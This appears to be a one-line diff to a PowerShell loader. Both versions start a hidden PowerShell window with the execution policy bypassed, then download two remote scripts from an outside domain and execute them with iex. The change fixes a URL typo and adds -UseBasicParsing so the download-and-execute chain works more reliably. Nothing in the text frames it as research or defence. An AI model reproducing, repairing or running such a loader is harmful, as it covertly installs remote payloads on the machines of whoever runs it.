@@ -1,1 +1,1 @@
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoLogo -NoProfile -ExecutionPolicy Bypass -Command `"iex (iwr hhttps://kenyontwo.com/byeworld11).Content; iex (iwr https://kenyontwo.com/test_https.ps1).Content`""
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoLogo -NoProfile -ExecutionPolicy Bypass -Command `"iex (iwr -UseBasicParsing https://kenyontwo.com/byeworld11).Content; iex (iwr -UseBasicParsing https://kenyontwo.com/test_https.ps1).Content`""
